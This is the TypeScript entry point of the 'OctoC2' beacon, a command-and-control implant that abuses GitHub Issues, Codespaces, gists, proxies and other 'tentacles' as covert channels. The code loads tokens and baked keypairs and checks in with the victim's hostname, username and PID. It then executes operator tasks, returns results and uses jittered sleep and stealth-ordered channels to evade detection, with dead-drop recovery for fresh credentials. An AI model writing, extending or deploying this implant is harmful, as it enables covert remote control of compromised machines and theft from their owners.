/**
 * OctoC2 Beacon — Entry Point
 *
 * Boot sequence:
 *   1. Resolve stable beacon ID (from existing state file or new UUID)
 *   2. Load persisted key pair if available (IssuesTentacle will create one if not)
 *   3. Build BeaconConfig and register IssuesTentacle with ConnectionFactory
 *   4. Run main loop: checkin → execute tasks → submit results → sleep (with jitter)
 *   5. Graceful shutdown on SIGINT / SIGTERM
 *
 * Environment variables:
 *   OCTOC2_GITHUB_TOKEN  (or SVC_TOKEN)  — GitHub PAT with repo scope (fallback when App auth absent)
 *   OCTOC2_REPO_OWNER                        — org/user owning the C2 repo
 *   OCTOC2_REPO_NAME                         — C2 repository name
 *   SVC_SLEEP   (default: 60)             — base sleep interval in seconds
 *   SVC_JITTER  (default: 0.3)            — jitter factor (0–1)
 *   OCTOC2_LOG_LEVEL (default: info)         — debug | info | warn | error
 *
 * GitHub App auth (optional — replaces PAT when all three are set):
 *   SVC_APP_ID           — numeric GitHub App ID
 *   SVC_INSTALLATION_ID  — installation ID for the C2 repo
 *   SVC_APP_PRIVATE_KEY  — RSA private key PEM (newlines as \n or literal)
 */

import { homedir }    from "node:os";
import { join }       from "node:path";
import { readdir, readFile } from "node:fs/promises";
import { existsSync } from "node:fs";

import { ConnectionFactory }  from "./factory/ConnectionFactory.ts";
import { registerTentacles }  from "./factory/registerTentacles.ts";
import { DeadDropResolver }   from "./recovery/DeadDropResolver.ts";
import { TaskExecutor }       from "./tasks/TaskExecutor.ts";
import { loadState }         from "./state/BeaconState.ts";
import { bytesToBase64, base64ToBytes, generateKeyPair } from "./crypto/sodium.ts";
import { GH_UA }              from "./lib/constants.ts";
import { createLogger }      from "./logger.ts";
import type { BeaconConfig, CheckinPayload, RelayConfig, ProxyConfig } from "./types.ts";
import type { DeadDropPayload } from "./recovery/DeadDropResolver.ts";

const log = createLogger("svc");

// ── Operator public key resolution ───────────────────────────────────────────

/**
 * Fetch the operator's X25519 public key from the MONITORING_PUBKEY repo variable.
 * Falls back to a zero key if the variable isn't set (IssuesTentacle will still
 * work as it fetches the key separately during init).
 */
async function resolveOperatorPublicKey(token: string, owner: string, repo: string): Promise<Uint8Array> {
  try {
    const resp = await fetch(
      `https://api.github.com/repos/${owner}/${repo}/actions/variables/MONITORING_PUBKEY`,
      { headers: { Authorization: `Bearer ${token}`, "User-Agent": GH_UA } },
    );
    if (resp.ok) {
      const data = await resp.json() as { value?: string };
      const b64 = data.value?.trim();
      if (b64) {
        const key = await base64ToBytes(b64);
        if (key.length === 32) {
          log.info("Resolved operator public key from MONITORING_PUBKEY variable");
          return key;
        }
      }
    }
  } catch { /* fall through */ }
  log.warn("Could not resolve MONITORING_PUBKEY — some tentacles may fail to decrypt tasks");
  return new Uint8Array(32);
}

// ── Beacon ID resolution ──────────────────────────────────────────────────────

/**
 * Find the existing beacon's state file and return its ID, or generate a
 * fresh UUID for a first-run beacon. IssuesTentacle will create the state
 * file on first checkin.
 */
async function resolveBeaconId(): Promise<string> {
  // Check for compile-time baked ID (octoctl build-beacon injects this).
  // Dot notation required: Bun --define only substitutes process.env.X, not process.env["X"].
  const bakedId = process.env.OCTOC2_BEACON_ID?.trim();
  if (bakedId) {
    log.info(`Using baked beacon ID: ${bakedId}`);
    return bakedId;
  }

  const home      = homedir();
  const configDir = process.platform === "win32"
    ? join(process.env["APPDATA"] ?? join(home, "AppData", "Roaming"), "svc")
    : join(process.env["XDG_CONFIG_HOME"] ?? join(home, ".config"), "svc");

  if (existsSync(configDir)) {
    try {
      const files = await readdir(configDir);
      for (const file of files) {
        if (!file.endsWith(".json")) continue;
        try {
          const raw  = await readFile(join(configDir, file), "utf8");
          const data = JSON.parse(raw) as { version?: number; beaconId?: string };
          if (data.version === 1 && typeof data.beaconId === "string") {
            log.info(`Resuming beacon ${data.beaconId}`);
            return data.beaconId;
          }
        } catch { /* corrupted file — skip */ }
      }
    } catch { /* can't read dir */ }
  }

  const id = crypto.randomUUID();
  log.info(`First run — new beacon ID: ${id}`);
  return id;
}

function parseRelayConsortium(): RelayConfig[] {
  const raw = process.env.OCTOC2_RELAY_CONSORTIUM?.trim();
  if (!raw) return [];
  try {
    const parsed = JSON.parse(raw) as unknown;
    if (!Array.isArray(parsed)) return [];
    return parsed.filter(
      (e): e is RelayConfig =>
        typeof e === "object" && e !== null &&
        typeof (e as any).account === "string" &&
        typeof (e as any).repo === "string"
    );
  } catch {
    return [];
  }
}

/** Valid tentacle kind strings for priority parsing. */
const VALID_TENTACLE_KINDS = new Set<string>([
  "issues", "codespaces", "branch", "actions", "secrets",
  "notes", "gist", "oidc", "relay", "proxy", "stego", "http",
]);

/**
 * Parse SVC_TENTACLE_PRIORITY env var into a tentacle priority list.
 * Format: comma-separated kinds, e.g. "codespaces,proxy,issues"
 *
 * When unset, auto-detects the stealthiest available order:
 *   1. "codespaces" — gRPC-over-SSH (if SVC_GRPC_DIRECT or Codespace SSH vars present)
 *   2. "http"       — WebSocket/REST on port 8080 (if SVC_HTTP_URL is set)
 *   3. "proxy"      — OctoProxy relay (if SVC_PROXY_REPOS is non-empty)
 *   4. "issues"     — plain GitHub Issues (always last resort)
 */
export function parseTentaclePriority(): Array<
  "issues" | "codespaces" | "branch" | "actions" | "secrets" |
  "notes" | "gist" | "oidc" | "relay" | "proxy" | "stego" | "http"
> {
  type Kind = "issues" | "codespaces" | "branch" | "actions" | "secrets" |
    "notes" | "gist" | "oidc" | "relay" | "proxy" | "stego" | "http";

  const raw = process.env.SVC_TENTACLE_PRIORITY?.trim();
  if (!raw) {
    // Auto-detect: prefer stealth channels when their prerequisites are present.
    const hasGrpc = Boolean(
      process.env.SVC_GRPC_DIRECT ||
      (process.env.SVC_GRPC_CODESPACE_NAME && process.env.SVC_GITHUB_USER)
    );
    const hasHttp = Boolean(process.env.SVC_HTTP_URL);
    const hasProxy = (() => {
      try {
        const p = JSON.parse(process.env.SVC_PROXY_REPOS?.trim() ?? "[]") as unknown;
        return Array.isArray(p) && p.length > 0;
      } catch { return false; }
    })();
    const order: Kind[] = [];
    if (hasGrpc)  order.push("codespaces");
    if (hasHttp)  order.push("http");
    if (hasProxy) order.push("proxy");
    order.push("issues"); // always the last-resort fallback
    return order;
  }

  const parts = raw.split(",").map(s => s.trim());
  const valid: Kind[] = [];
  const invalid: string[] = [];

  for (const part of parts) {
    if (VALID_TENTACLE_KINDS.has(part)) {
      valid.push(part as Kind);
    } else {
      invalid.push(part);
    }
  }

  if (invalid.length > 0) {
    log.warn(`Invalid tentacle priority entries ignored: ${invalid.join(", ")}`);
  }

  if (valid.length === 0) return ["issues"];
  return valid;
}

export function parseCleanupDays(): number | undefined {
  const raw = process.env.SVC_CLEANUP_DAYS?.trim();
  if (!raw) return undefined;
  const n = parseInt(raw, 10);
  if (isNaN(n) || n < 0) return undefined;
  return n;
}

export function parseProxyRepos(): ProxyConfig[] {
  const raw = process.env.SVC_PROXY_REPOS?.trim();
  if (!raw) return [];
  try {
    const parsed = JSON.parse(raw) as unknown;
    if (!Array.isArray(parsed)) return [];
    return (parsed as unknown[]).filter(
      (x): x is ProxyConfig =>
        typeof x === 'object' && x !== null &&
        typeof (x as ProxyConfig).owner === 'string' &&
        typeof (x as ProxyConfig).repo  === 'string' &&
        ((x as ProxyConfig).innerKind === 'issues' || (x as ProxyConfig).innerKind === 'notes'),
    );
  } catch {
    return [];
  }
}

// ── Config loading ────────────────────────────────────────────────────────────

async function loadConfig(beaconId: string): Promise<BeaconConfig> {
  // Support both OCTOC2_GITHUB_TOKEN (canonical) and SVC_TOKEN (legacy).
  const token = (process.env.OCTOC2_GITHUB_TOKEN ?? process.env.SVC_TOKEN ?? "").trim();
  const owner = (process.env.OCTOC2_REPO_OWNER ?? "").trim();
  const repo  = (process.env.OCTOC2_REPO_NAME  ?? "").trim();

  if (!token || !owner || !repo) {
    throw new Error(
      "Missing required configuration: token, owner, and repo must be set"
    );
  }

  // Load persisted keypair if we have one. IssuesTentacle will update
  // config.beaconKeyPair and create the state file on first init.
  const existingState = await loadState(beaconId);

  let beaconKeyPair: { publicKey: Uint8Array; secretKey: Uint8Array };

  // Dot notation required for Bun --define substitution at compile time.
  const bakedPubkey = process.env.OCTOC2_BEACON_PUBKEY?.trim();
  const bakedSeckey = process.env.OCTOC2_BEACON_SECKEY?.trim();

  if (bakedPubkey && bakedSeckey) {
    // Compile-time baked keypair (octoctl build-beacon)
    beaconKeyPair = {
      publicKey: await base64ToBytes(bakedPubkey),
      secretKey: await base64ToBytes(bakedSeckey),
    };
    log.info("Using baked beacon keypair");
  } else if (existingState) {
    beaconKeyPair = {
      publicKey: await base64ToBytes(existingState.keyPair.publicKey),
      secretKey: await base64ToBytes(existingState.keyPair.secretKey),
    };
  } else {
    // No existing state file — generate a fresh keypair now so all tentacles
    // (including non-IssuesTentacle primaries like NotesTentacle) send valid
    // public keys from the very first checkin. IssuesTentacle will persist this
    // keypair to the state file on its first init instead of creating a new one.
    beaconKeyPair = await generateKeyPair();
  }

  // ── GitHub App auth (optional) ───────────────────────────────────────────
  const appIdRaw          = process.env.SVC_APP_ID?.trim();
  const installationIdRaw = process.env.SVC_INSTALLATION_ID?.trim();
  // Support literal \n in the env var (common when set via shell export)
  const appPrivateKeyRaw  = process.env.SVC_APP_PRIVATE_KEY?.trim().replace(/\\n/g, "\n");

  const appId         = appIdRaw         ? parseInt(appIdRaw, 10)         : undefined;
  const installationId = installationIdRaw ? parseInt(installationIdRaw, 10) : undefined;
  const appPrivateKey  = appPrivateKeyRaw  || undefined;

  return {
    id:    beaconId,
    repo:  { owner, name: repo },
    token,
    tentaclePriority: parseTentaclePriority(),
    sleepSeconds: parseInt(process.env.SVC_SLEEP  ?? "60",  10),
    jitter:       parseFloat(process.env.SVC_JITTER ?? "0.3"),
    // Fetch operator public key from the MONITORING_PUBKEY repo variable.
    // All tentacles need this for decrypting tasks (crypto_box) and sealing results.
    operatorPublicKey: await resolveOperatorPublicKey(token, owner, repo),
    beaconKeyPair,
    proxyRepos: parseProxyRepos(),
    ...(parseCleanupDays() !== undefined ? { cleanupDays: parseCleanupDays()! } : {}),
    // GitHub App fields — omitted when not configured (PAT fallback applies)
    ...(appId         !== undefined ? { appId }         : {}),
    ...(installationId !== undefined ? { installationId } : {}),
    ...(appPrivateKey  !== undefined ? { appPrivateKey }  : {}),
  };
}

// ── Checkin payload ───────────────────────────────────────────────────────────

async function buildCheckinPayload(config: BeaconConfig): Promise<CheckinPayload> {
  return {
    beaconId:  config.id,
    publicKey: await bytesToBase64(config.beaconKeyPair.publicKey),
    hostname:  process.env["HOSTNAME"] ?? "unknown",
    username:  process.env["USER"] ?? process.env["USERNAME"] ?? "unknown",
    os:        process.platform,
    arch:      process.arch,
    pid:       process.pid,
    checkinAt: new Date().toISOString(),
  };
}

// ── Sleep with jitter ─────────────────────────────────────────────────────────

function sleepMs(ms: number): Promise<void> {
  return new Promise((r) => setTimeout(r, ms));
}

/**
 * Compute a jittered sleep duration.
 * Returns a value in [base*(1-jitter), base*(1+jitter)], minimum 1 s.
 */
function jitteredSleepMs(baseSeconds: number, jitter: number): number {
  const base   = baseSeconds * 1000;
  const window = base * jitter;
  const offset = (Math.random() * 2 - 1) * window;  // ± window
  return Math.max(1000, Math.round(base + offset));
}

/**
 * Merge a dead-drop payload into the live BeaconConfig.
 * Mutates config in-place so all tentacles see the updated values.
 */
function applyDrop(config: BeaconConfig, drop: DeadDropPayload): void {
  if (drop.token)            config.token            = drop.token;
  if (drop.tentaclePriority) config.tentaclePriority = drop.tentaclePriority;
  if (drop.consortium)       config.relayConsortium  = drop.consortium;
  if (drop.proxyRepos)       config.proxyRepos       = drop.proxyRepos;
  if (drop.appPrivateKey)    config.appPrivateKey    = drop.appPrivateKey;
  if (drop.appId)            config.appId            = drop.appId;
  if (drop.installationId)   config.installationId   = drop.installationId;
  // serverUrl is not in BeaconConfig — log for operator awareness.
  if (drop.serverUrl) {
    log.info(`Dead-drop: new server URL hint: ${drop.serverUrl}`);
  }
}

/**
 * Re-register all tentacles in the factory based on the current config.
 * Call after applyDrop() mutates the priority/consortium.
 */
async function rebuildFactory(
  factory: ConnectionFactory,
  config: BeaconConfig
): Promise<void> {
  await factory.teardown();
  await registerTentacles(factory, config, { silent: true });
}

// ── Main beacon loop ──────────────────────────────────────────────────────────

async function main(): Promise<void> {
  log.info("Beacon starting...");

  const beaconId = await resolveBeaconId();
  const config   = await loadConfig(beaconId);

  // ── Wire up tentacles ─────────────────────────────────────────────────────
  const factory  = new ConnectionFactory({ config });
  const executor = new TaskExecutor(config);

  // Parse relay consortium from baked env var (needed before tentacle registration)
  const consortium = parseRelayConsortium();
  config.relayConsortium = consortium;

  // Single source of truth for tentacle registration
  await registerTentacles(factory, config);

  // Dead-drop resolver (last resort — only used when all tentacles exhausted)
  const deadDropResolver = new DeadDropResolver(
    config.token,
    config.repo.owner,
    config.repo.name,
  );

  // ── Graceful shutdown ─────────────────────────────────────────────────────
  let running = true;

  const shutdown = (signal: string) => {
    log.info(`Received ${signal} — shutting down after current iteration.`);
    running = false;
  };

  process.on("SIGINT",  () => shutdown("SIGINT"));
  process.on("SIGTERM", () => shutdown("SIGTERM"));

  // ── Sleep constants (may be updated by 'sleep' tasks) ────────────────────
  let sleepSeconds = config.sleepSeconds;
  let sleepJitter  = config.jitter;

  log.info(
    `Beacon ${beaconId} ready. ` +
    `Repo: ${config.repo.owner}/${config.repo.name} ` +
    `Sleep: ${sleepSeconds}s ±${Math.round(sleepJitter * 100)}%`
  );

  // ── Main loop ─────────────────────────────────────────────────────────────
  while (running) {
    try {
      // 1. Build a fresh checkin payload (picks up updated keypair after first init)
      const payload = await buildCheckinPayload(config);

      // 2. Checkin — blocks during initialization on first run, then returns tasks
      const tasks = await factory.checkin(payload);

      // Dead-drop recovery: trigger when all tentacles are exhausted
      if (tasks.length === 0 && factory.isFullyExhausted()) {
        log.warn("All tentacles exhausted — attempting dead-drop recovery...");
        const drop = await deadDropResolver.resolve(
          beaconId,
          config.beaconKeyPair.secretKey,
        );
        if (drop) {
          log.info("Dead-drop found — applying and rebuilding tentacles");
          applyDrop(config, drop);
          await rebuildFactory(factory, config);
        }
      }

      if (tasks.length > 0) {
        log.info(`Received ${tasks.length} task(s).`);
      }

      // 3. Execute each task in order
      for (const task of tasks) {
        if (!running) break;

        log.info(`Executing task ${task.taskId} (${task.kind})`);

        const { result, directive } = await executor.execute(task, config.id);

        // 4. Submit result
        const submitted = await factory.submitResult(result);
        if (!submitted) {
          log.error(`Failed to submit result for task ${task.taskId}`);
        }

        // 5. Apply directives from the task
        if (directive.kind === "kill") {
          log.warn("Kill directive — exiting.");
          running = false;
          break;
        }

        if (directive.kind === "update_sleep") {
          sleepSeconds = directive.seconds;
          sleepJitter  = directive.jitter;
          log.info(`Sleep updated: ${sleepSeconds}s ±${Math.round(sleepJitter * 100)}%`);
        }
      }
    } catch (err) {
      log.error(`Loop error: ${(err as Error).message}`);
    }

    // 6. Sleep before next checkin
    if (running) {
      const delay = jitteredSleepMs(sleepSeconds, sleepJitter);
      log.info(`Sleeping ${Math.round(delay / 1000)}s…`);
      await sleepMs(delay);
    }
  }

  // ── Teardown ──────────────────────────────────────────────────────────────
  log.info("Tearing down tentacles…");
  await factory.teardown();
  log.info("Shutdown complete.");
}

if (import.meta.main) {
  main().catch((err) => {
    // Use console.error here since the logger may not be initialized yet
    console.error(`[FATAL] [svc] ${(err as Error).message}`);
    process.exit(1);
  });
}
